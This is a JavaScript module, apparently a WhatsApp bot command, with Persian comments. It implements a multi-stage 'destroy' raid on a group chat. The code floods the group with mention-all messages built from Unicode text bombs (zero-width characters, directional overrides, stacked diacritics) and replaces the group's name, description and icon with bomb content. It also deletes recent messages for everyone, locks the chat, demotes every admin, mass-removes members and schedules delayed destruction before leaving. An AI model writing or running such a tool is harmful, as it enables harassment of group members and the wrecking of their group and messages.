// =======================
// DESTROY.JS v2 — نابودگر نهایی گروه (تخریب چندلایه)
//
//   !destroy                 → نابودی کامل (همه مراحل پشت‌سرهم)
//   !destroy name <n> <s>    → چرخش خودکار نام مخرب (n بار، هر s ثانیه)
//   !destroy wipe <n>        → پاکسازی n پیام اخیر همهٔ اعضا (حذف برای همه)
//   !destroy lock            → قفل گروه (فقط ادمین‌ها پیام بدهند + قفل اطلاعات)
//   !destroy flood <n>       → فلاد سنگین با منشن همه
//   !destroy sched <hours>   → نابودی خودکار بعد از n ساعت (زمان‌بندی شده)
//   !destroy remove <n>      → حذف n عضو
//   !destroy demote          → دموت همهٔ ادمین‌ها (فقط superadmin)
//   !destroy icon            → بمب آیکون گروه (تصویر نویز + نام مخرب)
//   !destroy leave           → خروج بات (انحلال گروه اگر آخرین عضو باشد)
//   !destroy status          → وضعیت گروه و نقش بات
//   !destroy cancel          → توقف فوری + لغو زمان‌بندی
// =======================

import zlib from "zlib";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let STOP = false;
const timers = new Map(); // group → setTimeout

const isAdmin = (p) => p.admin === "admin" || p.admin === "superadmin";

// ---------- بمب نام (زیر سقف ۵۰۰ کاراکتری) ----------
const subjectBomb = () =>
  "💀\u202E" +
  "\u200B".repeat(200) +
  "👨\u200D👩\u200D👧\u200D👦".repeat(15) +
  "⚫\u200B".repeat(40) +
  "\uFE0F".repeat(50);

// ---------- بمب توضیح ----------
const descriptionBomb = () =>
  "\u200B".repeat(15000) +
  "\n⚠️ این گروه غیرفعال شده است ⚠️\n" +
  "\u202E".repeat(2000) +
  "\u0651\u064E\u0650".repeat(2000);

// ---------- پیلودهای فلاد ----------
const floodTexts = [
  () => "\u200B".repeat(3500) + "⚫",
  () => "⚫\u200B".repeat(1000),
  () => "لَا إِلَٰهَ إِلَّا اللَّهُ" + "\u0651\u064E\u064F\u0650\u0652".repeat(1800),
  () => "👨\u200D👩\u200D👧\u200D👦".repeat(300),
  () => "ༀ".repeat(1500),
  () => "\u202E" + "!ینامزاس یسررب".repeat(120),
];

// ---------- ساخت PNG نویز کوچک برای آیکون ----------
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();
const crc32 = (buf) => {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
};
const chunk = (type, data) => {
  const t = Buffer.from(type);
  const out = Buffer.alloc(8 + data.length);
  out.writeUInt32BE(data.length, 0);
  t.copy(out, 4);
  data.copy(out, 8);
  out.writeUInt32BE(crc32(Buffer.concat([t, data])), 8 + data.length);
  return out;
};

function makeNoisePng(w, h, seed) {
  let s = seed >>> 0;
  const rnd = () => (s = (s * 1664525 + 1013904223) >>> 0);
  const row = Buffer.alloc(1 + w * 3);
  const rows = [];
  for (let y = 0; y < h; y++) {
    row[0] = 0;
    for (let x = 0; x < w; x++) {
      row[1 + x * 3] = rnd() & 0xFF;
      row[2 + x * 3] = rnd() & 0xFF;
      row[3 + x * 3] = rnd() & 0xFF;
    }
    rows.push(Buffer.from(row));
  }
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0);
  ihdr.writeUInt32BE(h, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  return Buffer.concat([
    Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]),
    chunk("IHDR", ihdr),
    chunk("IDAT", zlib.deflateSync(Buffer.concat(rows))),
    chunk("IEND", Buffer.alloc(0)),
  ]);
}

// ---------- فلاد با منشن همه ----------
async function mentionFlood(sock, from, count) {
  let meta;
  try { meta = await sock.groupMetadata(from); } catch (e) { return 0; }
  const ids = meta.participants.map((p) => p.id);
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    try {
      await sock.sendMessage(from, {
        text: floodTexts[i % floodTexts.length]() + "\n@all",
        mentions: ids,
      });
      ok++;
    } catch (e) { console.log("DESTROY flood:", e.message); }
    await sleep(150);
  }
  return ok;
}

// ---------- قفل کامل گروه ----------
async function lockGroup(sock, from) {
  const out = {};
  try {
    await sock.groupSettingUpdate(from, "announcement");
    out.chat = true;
  } catch (e) { out.chat = false; console.log("LOCK chat:", e.message); }
  try {
    await sock.groupSettingUpdate(from, "locked");
    out.info = true;
  } catch (e) { out.info = false; console.log("LOCK info:", e.message); }
  return out;
}

// ---------- پاکسازی پیام‌های اخیر (حذف برای همه) ----------
async function wipeMessages(sock, from, limit) {
  let deleted = 0, errors = 0;
  let msgs = [];
  try { msgs = await sock.loadMessages(from, limit); } catch (e) { console.log("WIPE load:", e.message); return 0; }

  for (const msg of msgs) {
    if (STOP) break;
    const key = msg.key;
    if (!key || key.remoteJid !== from) continue;
    try {
      await sock.sendMessage(from, {
        delete: {
          remoteJid: from,
          fromMe: key.fromMe,
          id: key.id,
          participant: key.participant,
        },
      });
      deleted++;
      await sleep(250);
    } catch (e) {
      errors++;
      console.log("WIPE del:", e.message);
      if (errors > 10) break; // ادمین نیست یا پیام خیلی قدیمی است
    }
  }
  return deleted;
}

// ---------- چرخش خودکار نام ----------
async function rotateName(sock, from, rounds, intervalSec) {
  const names = [
    subjectBomb(),
    "💀 گروه حذف شد",
    "\u202E!ناگروه ناتخد",
    "⚠️\ufe0f".repeat(50),
    "DESTROYED",
    "👨\u200D👩\u200D👧\u200D👦".repeat(20),
  ];
  let ok = 0;
  for (let i = 0; i < rounds; i++) {
    if (STOP) break;
    try {
      await sock.groupUpdateSubject(from, names[i % names.length]);
      ok++;
    } catch (e) { console.log("ROTATE:", e.message); }
    await sleep(intervalSec * 1000);
  }
  return ok;
}

// ---------- دموت همهٔ ادمین‌ها ----------
async function demoteAll(sock, from, meta, botId) {
  const admins = meta.participants.filter((p) => isAdmin(p) && p.id.split("@")[0] !== botId);
  let ok = 0;
  for (let i = 0; i < admins.length; i += 5) {
    if (STOP) break;
    try {
      await sock.groupParticipantsUpdate(from, admins.slice(i, i + 5).map((p) => p.id), "demote");
      ok += Math.min(5, admins.length - i);
    } catch (e) { console.log("DEMOTE:", e.message); }
    await sleep(500);
  }
  return ok;
}

// ---------- حذف اعضا ----------
async function removeMembers(sock, from, meta, botId, limit) {
  const members = meta.participants.filter((p) => p.id.split("@")[0] !== botId);
  let removed = 0, errors = 0;
  for (let i = 0; i < members.length && removed < limit; i++) {
    if (STOP) break;
    try {
      await sock.groupParticipantsUpdate(from, [members[i].id], "remove");
      removed++;
      await sleep(650);
      if (removed % 10 === 0) {
        await sock.sendMessage(from, { text: `🗑 ${removed} عضو حذف شد...` });
      }
    } catch (e) {
      errors++;
      console.log("REMOVE:", members[i].id, e.message);
      if (errors > 5) break;
    }
  }
  return removed;
}

// ---------- بمب آیکون ----------
async function iconBomb(sock, from) {
  const img = makeNoisePng(512, 512, Date.now());
  try {
    await sock.updateProfilePicture(from, img);
    return true;
  } catch (e) {
    console.log("ICON:", e.message);
    return false;
  }
}

// ---------- نابودی کامل (همه مراحل) ----------
async function fullDestroy(sock, from, meta) {
  const botId = sock.user?.id?.split(":")[0] || "";
  const bot = meta.participants.find((p) => p.id.split("@")[0] === botId);
  const botIsAdmin = bot && isAdmin(bot);
  const botIsCreator = bot?.admin === "superadmin";
  const log = [];

  // ۱) قفل گروه
  if (botIsAdmin) {
    const l = await lockGroup(sock, from);
    log.push(`🔒 قفل: چت=${l.chat ? "✅" : "❌"} اطلاعات=${l.info ? "✅" : "❌"}`);
  }

  // ۲) بمب نام + توضیح + آیکون
  if (botIsAdmin) {
    try {
      await sock.groupUpdateSubject(from, subjectBomb());
      await sock.groupUpdateDescription(from, descriptionBomb());
      await iconBomb(sock, from);
      log.push("💣 نام + توضیح + آیکون بمب‌گذاری شد");
    } catch (e) { console.log("SUBJ:", e.message); }
  }

  // ۳) پاکسازی تاریخچه
  if (botIsAdmin && !STOP) {
    const w = await wipeMessages(sock, from, 30);
    log.push(`🧹 ${w} پیام اخیر از همهٔ دستگاه‌ها حذف شد`);
  }

  // ۴) فلاد سنگین
  if (!STOP) {
    const n = await mentionFlood(sock, from, 25);
    log.push(`🔥 ${n} پیام سنگین`);
  }

  // ۵) دموت ادمین‌ها
  if (botIsCreator && !STOP) {
    const d = await demoteAll(sock, from, meta, botId);
    log.push(`🗡 ${d} ادمین دموت شد`);
  } else if (!botIsCreator) {
    log.push("⚠️ دموت ممکن نیست (بات سازنده نیست)");
  }

  // ۶) حذف اعضا
  if (botIsAdmin && !STOP) {
    const r = await removeMembers(sock, from, meta, botId, 100000);
    log.push(`🗑 ${r} عضو حذف شد`);
  }

  // ۷) خروج → انحلال
  if (!STOP) {
    log.push("👋 خروج بات...");
    await sock.sendMessage(from, { text: log.join("\n") + "\n\n💥 گروه در حال انحلال است" });
    await sleep(1500);
    try { await sock.groupLeave(from); } catch (e) { console.log("LEAVE:", e.message); }
  }
  return log;
}

// ---------- زمان‌بندی نابودی ----------
function schedule(sock, from, hours) {
  cancelSchedule(from);
  const t = setTimeout(async () => {
    try {
      const meta = await sock.groupMetadata(from);
      await sock.sendMessage(from, { text: "⏰ زمان نابودی فرا رسید..." });
      await fullDestroy(sock, from, meta);
    } catch (e) { console.log("SCHED:", e.message); }
  }, hours * 3600 * 1000);
  timers.set(from, t);
}

function cancelSchedule(from) {
  if (timers.has(from)) {
    clearTimeout(timers.get(from));
    timers.delete(from);
  }
}

// ---------- هندلر ----------
export default async function destroy(sock, from, body, m, args) {
  try {
    if (!from.includes("@g.us")) {
      await sock.sendMessage(from, { text: "❌ فقط در گروه کار می‌کند." });
      return;
    }

    STOP = false;
    const arg = (args[0] || "").toLowerCase();
    const meta = await sock.groupMetadata(from);
    const botId = sock.user?.id?.split(":")[0] || "";
    const bot = meta.participants.find((p) => p.id.split("@")[0] === botId);
    const botIsAdmin = bot && isAdmin(bot);
    const botIsCreator = bot?.admin === "superadmin";

    const getN = (def, max) => {
      const v = parseInt(args[1]);
      return Math.min(Number.isFinite(v) ? v : def, max);
    };

    switch (arg) {
      case "cancel":
        STOP = true;
        cancelSchedule(from);
        await sock.sendMessage(from, { text: "🛑 عملیات متوقف و زمان‌بندی لغو شد." });
        return;

      case "status":
        await sock.sendMessage(from, {
          text: `📊 وضعیت گروه:\n` +
                `نام: ${meta.subject}\n` +
                `اعضا: ${meta.participants.length}\n` +
                `نقش بات: ${!bot ? "عضو نیست" : botIsCreator ? "سازنده 👑" : botIsAdmin ? "ادمین" : "عضو عادی"}\n` +
                `ادمین‌ها: ${meta.participants.filter(isAdmin).length}`,
        });
        return;

      case "name":
        await sock.groupUpdateSubject(from, subjectBomb());
        await sock.groupUpdateDescription(from, descriptionBomb());
        await iconBomb(sock, from);
        await sock.sendMessage(from, { text: "💣 نام، توضیح و آیکون بمب‌گذاری شد." });
        return;

      case "rotate": {
        const rounds = getN(10, 100);
        const interval = Math.max(parseInt(args[2]) || 3, 2);
        await sock.sendMessage(from, { text: `🔄 چرخش نام شروع شد (${rounds} بار، هر ${interval} ثانیه).` });
        const n = await rotateName(sock, from, rounds, interval);
        await sock.sendMessage(from, { text: `🔄 ${n} بار نام گروه عوض شد.` });
        return;
      }

      case "wipe": {
        if (!botIsAdmin) {
          await sock.sendMessage(from, { text: "⛔ بات باید ادمین باشد تا پیام‌ها را برای همه حذف کند." });
          return;
        }
        const n = await wipeMessages(sock, from, getN(30, 100));
        await sock.sendMessage(from, { text: `🧹 ${n} پیام اخیر از دستگاه همه حذف شد.` });
        return;
      }

      case "lock": {
        if (!botIsAdmin) {
          await sock.sendMessage(from, { text: "⛔ بات باید ادمین باشد." });
          return;
        }
        const l = await lockGroup(sock, from);
        await sock.sendMessage(from, {
          text: `🔒 قفل گروه:\nچت (فقط ادمین): ${l.chat ? "✅" : "❌"}\nاطلاعات: ${l.info ? "✅" : "❌"}`,
        });
        return;
      }

      case "flood": {
        const n = await mentionFlood(sock, from, getN(50, 200));
        await sock.sendMessage(from, { text: `🔥 ${n} پیام سنگین ارسال شد.` });
        return;
      }

      case "sched": {
        const hours = getN(24, 168);
        schedule(sock, from, hours);
        await sock.sendMessage(from, {
          text: `⏰ نابودی خودکار در ${hours} ساعت دیگر برنامه‌ریزی شد.\nلغو: !destroy cancel`,
        });
        return;
      }

      case "remove": {
        if (!botIsAdmin) {
          await sock.sendMessage(from, { text: "⛔ بات باید ادمین باشد." });
          return;
        }
        const r = await removeMembers(sock, from, meta, botId, getN(10, 500));
        await sock.sendMessage(from, { text: `🗑 ${r} عضو حذف شد.` });
        return;
      }

      case "demote": {
        if (!botIsCreator) {
          await sock.sendMessage(from, { text: "⛔ فقط سازندهٔ گروه می‌تواند ادمین‌ها را دموت کند." });
          return;
        }
        const d = await demoteAll(sock, from, meta, botId);
        await sock.sendMessage(from, { text: `🗡 ${d} ادمین دموت شد.` });
        return;
      }

      case "icon": {
        const ok = await iconBomb(sock, from);
        await sock.sendMessage(from, { text: ok ? "🖼 آیکون گروه بمب‌گذاری شد." : "❌ شکست (بات ادمین نیست؟)" });
        return;
      }

      case "leave":
        await sock.sendMessage(from, { text: "👋 بات در حال ترک گروه است..." });
        await sleep(1000);
        await sock.groupLeave(from);
        return;

      default: {
        // نابودی کامل
        await sock.sendMessage(from, { text: "💥 شروع نابودی کامل گروه..." });
        const log = await fullDestroy(sock, from, meta);
        // اگر هنوز داخل گروه است (خروج ناموفق) گزارش بده
        try {
          await sock.sendMessage(from, { text: log.join("\n") });
        } catch (e) {}
        return;
      }
    }
  } catch (e) {
    console.log("DESTROY ERROR:", e.message);
    try { await sock.sendMessage(from, { text: `❌ خطا: ${e.message}` }); } catch (e2) {}
  }
}
